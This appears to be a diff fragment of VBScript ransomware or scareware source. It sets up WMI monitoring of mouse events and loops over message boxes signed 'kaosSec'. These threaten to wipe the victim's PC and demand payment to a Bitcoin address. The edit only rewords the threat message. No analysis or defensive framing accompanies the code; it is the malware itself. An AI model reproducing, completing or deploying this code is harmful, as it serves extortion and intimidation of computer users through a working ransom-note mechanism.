@@ -564,7 +564,7 @@ Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 Set colMonitoredEvents = objWMIService.ExecNotificationQuery("SELECT * FROM __InstanceOperationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PointingDevice'")
 
 Do
-MsgBox "if there's any mouse input you'll lose files forever - kaosSec", vbInformation, "winz0r32"
+MsgBox "if there's any mouse input your pc will be wiped - kaosSec", vbInformation, "winz0r32"
 MsgBox "KINDLY PAY FOR ANY ADVICE ON HOW TO CONTINUE OR IDK.... FIGURE IT OUT URSELF: 1BYc2fMJxi3cwrEneTJbTC47oJZ8Xfsdib", vbInformation, "Windows"
 WScript.Echo "MADNESS, MADNESS"
 WScript.Echo "1BYc2fMJxi3cwrEneTJbTC47oJZ8Xfsdib"
